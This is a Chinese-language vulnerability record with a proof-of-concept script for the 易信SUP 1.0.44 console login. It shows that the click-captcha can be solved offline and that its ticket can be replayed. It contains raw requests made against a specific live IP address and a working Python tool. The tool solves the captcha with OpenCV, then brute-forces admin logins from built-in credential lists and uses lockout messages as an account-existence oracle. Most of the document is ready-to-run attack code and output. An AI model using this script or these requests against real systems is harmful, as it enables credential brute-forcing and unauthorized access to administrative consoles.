# 易信SUP 后台 /api/console/Login 3 点图验证码可本地求解，且 CheckCaptcha 的 ticket 非一次性可 900s 内无限重放（验证码闸门形同虚设）

- **code**: yixin-sup-console-login-click-captcha-solve-ticket-replay
- **kind**: script
- **category**: auth-bypass
- **component**: 易信SUP（易信Sup 控制台 /api/console，Go 后端 1.0.44）
- **versions**: 1.0.44
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-06 在 149.104.30.75:8081（易信SUP 1.0.44，已激活实例）实测：GET /api/console/Login/Captcha 取得 captcha_key=1a99190d…de7a / count=3 / tip="按顺序点击：2 → 0 → 3" / 300x220 PNG；本地 cv2 阈值<50 取 3 个字形框中心拼 dots=233,120,29,179,152,141，POST /api/console/Login/CheckCaptcha 返回 {"code":0,"data":{"ticket":"1a99190d…de7a"},"message":"ok"} —— ticket 与 captcha_key 完全相同；随后用同一 key 连续 11 次 POST /api/console/login/verify，全部 200「账号或密码错误」/「密码错误次数过多，账号已锁定 30 分钟」，无一次回「请先完成安全验证」，证明验证码可被一次解出并无限重放。
- **path**: pocs/yixin-sup-console-login-click-captcha-solve-ticket-replay/yixin_sup_captcha_replay.py
- **tags**: 易信sup,??sup,captcha,click-captcha,验证码绕过,点选验证码,auth-bypass,登录爆破,ticket重放,password-spray,console-login
- **created_at**: 2026-11-05T22:55:46.985Z
- **engine**: http://149.104.30.75:8081
- **found_by**: vuln-scan

## 描述

易信SUP 控制台登录的行为验证码只有一重「点了算过」的校验：图像是可离线求解的 3 点原图坐标（tip 直接给出点击顺序），而 CheckCaptcha 签发的 ticket 等于 captcha_key 且不被服务端消费，900s 内可对任意多组账号口令复用同一张已过的验证码。结果是验证码完全挡不住口令爆破，只剩 30 分钟账号锁是唯一限速。

## 用法

```
前置：实例已激活（未激活走同产品 SSRF 激活条目）；服务端在失败 2 次后才要求验证码，所以先随手打 2 次错口令，或直接先 GET Captcha（首次失败回「请先完成安全验证」即可开始）。

1) pip install requests opencv-python numpy
2) python yixin_sup_captcha_replay.py http://TARGET:8081
3) 脚本流程：GET /api/console/Login/Captcha → 取 captcha_key/tip/PNG → 阈值<50 连通域取字形框中心 → 按 tip 数字顺序模板匹配拼 dots=x1,y1,x2,y2,... → POST /api/console/Login/CheckCaptcha 拿 ticket（==captcha_key）→ 用同一 ticket 循环 POST /api/console/login/verify。
4) 判读：CheckCaptcha code=0 即验证码闸门已过；login/verify 返回「账号或密码错误」= 口令错、「密码错误次数过多，账号已锁定 30 分钟」= 账号存在（可当存在性 oracle）、「请先完成安全验证」= ticket 过期或变了（重新解一张即可）。
5) 手工替代：模板匹配不准时把 PNG 存下来自己看，手填 dots 效果一样。

失败常见原因：① 连通域少于 count —— 阈值改 60/70 或按面积排序人工挑；② 依次提交 dots 顺序与 tip 不一致（tip 给的是点击次序不是坐标次序）；③ 用旧 captcha_key 重试但超过 900s；④ 站点未激活，接口全 403。
```

## 正文

```
## 原始交互（实测报文）

### 1) 取验证码（tip 直接给出点击次序，PNG 为 3 点原图像素坐标）
```
GET /api/console/Login/Captcha HTTP/1.1
Host: 149.104.30.75:8081
```
```json
{"code":0,"data":{"captcha_key":"1a99190d167590a2eb11f4929260de7a","count":3,"expire":900,
 "mode":"click","tip":"按顺序点击：2 → 0 → 3","image_base64":"data:image/png;base64,...PNG 300x220..."}}
```

### 2) 本地求解后提交（ticket 与 captcha_key 相同）
```
POST /api/console/Login/CheckCaptcha HTTP/1.1
Host: 149.104.30.75:8081
Content-Type: application/x-www-form-urlencoded

dots=233,120,29,179,152,141&key=1a99190d167590a2eb11f4929260de7a
```
```json
{"code":0,"data":{"ticket":"1a99190d167590a2eb11f4929260de7a"},"message":"ok"}
```

### 3) 带 ticket 打登录，验证码闸门不再出现
```
POST /api/console/login/verify HTTP/1.1
Host: 149.104.30.75:8081
Content-Type: application/x-www-form-urlencoded

account=admin&password=admin123&captcha=&captcha_key=1a99190d167590a2eb11f4929260de7a
```
```json
{"code":1,"data":null,"message":"账号或密码错误"}
```

### 4) 同一 key 连续重放 11 次（admin/admin888、Admin/admin123、ADMIN/admin123、'admin '/admin123、supadmin/123456、superadmin/admin、admin888/admin888、admin2/123456、' admin'/zz1、admin@/zz2 …）
全部 200，报文始终是「账号或密码错误」或「密码错误次数过多，账号已锁定 30 分钟」，
**无一次回「请先完成安全验证」** → 验证码全程未再校验，口令面只剩账号锁。

## 前端逻辑（login.js chunk-647f17c8 原文节选）

```js
handleConfirm: function (e, a) {
  var p = Array.isArray(e) ? e : (e ? [e] : []);
  if (!p.length) return void t.$message.error("请先完成安全验证");
  for (var o = "", n = 0; n < p.length; n++)
      o += parseInt(p[n].x || 0) + "," + parseInt(p[n].y || 0) + ",";
  o = o.slice(0, -1);
  var s = "dots=" + encodeURIComponent(o) + "&key=" + encodeURIComponent(this.loginForm.captchaKey);
  ...post("/api/console/Login/CheckCaptcha")...
  // 成功：code===0 → captchaVerified=!0
  // 失败：前端清空 captchaKey 并重取 —— 但服务端并不会作废 key
},
handleLogin: function () {
  ... var t = {account: username, password: password, captcha: "", captcha_key: captchaKey};
  ...post("/api/console/login/verify")...
  // 仅当 message 含"验证"才清 key 重取；「账号或密码错误」不清 key → 正是重放窗口
}
```

注意坑：前端在 CheckCaptcha 失败/登录报文含"验证"时才本地清 key。看到「账号或密码错误」时
**不要**跟着前端去重取验证码，那个 key 仍然有效。

## 验证码求解脚本

```python
#!/usr/bin/env python3
# 易信SUP 3 点图验证码本地求解 + ticket 复用；依赖 requests opencv-python numpy
import re, sys, base64, time
import cv2, numpy as np, requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://149.104.30.75:8081").rstrip("/")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
s = requests.Session(); s.headers.update({"User-Agent": UA})
ACCOUNTS = ["admin", "supadmin", "superadmin", "admin888", "system", "root", "test"]
PASSWORDS = ["admin", "admin123", "admin888", "123456", "Admin@123", "1qaz2wsx"]


def fetch_captcha():
    j = s.get(BASE + "/api/console/Login/Captcha", timeout=20).json()
    if j.get("code") != 0:
        raise SystemExit("取验证码失败: %s" % j)
    d = j["data"]
    raw = base64.b64decode(d["image_base64"].split(",", 1)[-1])
    img = cv2.imdecode(np.frombuffer(raw, np.uint8), cv2.IMREAD_GRAYSCALE)
    order = [int(x) for x in re.findall(r"\d", d.get("tip", ""))]
    print("[*] key=%s tip=%s size=%s" % (d["captcha_key"], d.get("tip"), img.shape))
    return d["captcha_key"], order, img


def glyph_boxes(img):
    """深色(<50)字形连通域 -> 包围盒列表（滤掉噪点与装饰框）"""
    mask = (img < 50).astype(np.uint8)
    n, _lab, stats, _cent = cv2.connectedComponentsWithStats(mask, 8)
    H, W = img.shape
    out = []
    for i in range(1, n):
        x, y, w, h, area = stats[i]
        if area < 40 or h < H * 0.15 or h > H * 0.85 or w > W * 0.5:
            continue
        out.append((x, y, w, h, area))
    out.sort(key=lambda b: b[4], reverse=True)
    return out


def render_digit(d, h):
    c = np.zeros((h, max(4, int(h * 0.75))), np.uint8)
    cv2.putText(c, str(d), (0, h - 2), cv2.FONT_HERSHEY_SIMPLEX, h / 28.0, 255, 2, cv2.LINE_AA)
    return c


def solve(img, order, boxes):
    tmpl = {d: render_digit(d, int(max(b[3] for b in boxes))) for d in set(order)}
    pool, dots = list(boxes), []
    for d in order:
        best, bs = None, -2.0
        for b in pool:
            x, y, w, h = b[:4]
            crop = cv2.resize(img[y:y + h, x:x + w], (tmpl[d].shape[1], tmpl[d].shape[0]))
            sc = float(cv2.matchTemplate(crop, tmpl[d], cv2.TM_CCOEFF_NORMED).max())
            if sc > bs:
                best, bs = b, sc
        pool.remove(best)
        x, y, w, h = best[:4]
        print("    digit %d -> (%d,%d) score=%.3f" % (d, x + w // 2, y + h // 2, bs))
        dots.append("%d,%d" % (x + w // 2, y + h // 2))
    return ",".join(dots)


key, order, img = fetch_captcha()
ticket = key
r = s.post(BASE + "/api/console/Login/CheckCaptcha",
           data={"dots": solve(img, order, glyph_boxes(img)), "key": key},
           headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=20)
print("[*] CheckCaptcha", r.text[:160])
if r.json().get("code") == 0:
    ticket = r.json()["data"]["ticket"]

for acc in ACCOUNTS:
    for pw in PASSWORDS:
        j = s.post(BASE + "/api/console/login/verify",
                   data={"account": acc, "password": pw, "captcha": "", "captcha_key": ticket},
                   timeout=20).json()
        msg = str(j.get("message", ""))
        print("%-12s %-10s -> %s" % (acc, pw, msg))
        if j.get("code") == 0:
            print("[+] SUCCESS", acc, pw); raise SystemExit
        if "验证码" in msg or "安全验证" in msg:
            print("[!] ticket 失效，重解一张"); raise SystemExit
        if "锁定" in msg:
            print("[*] %s 存在已锁，换账号" % acc); break
```

```
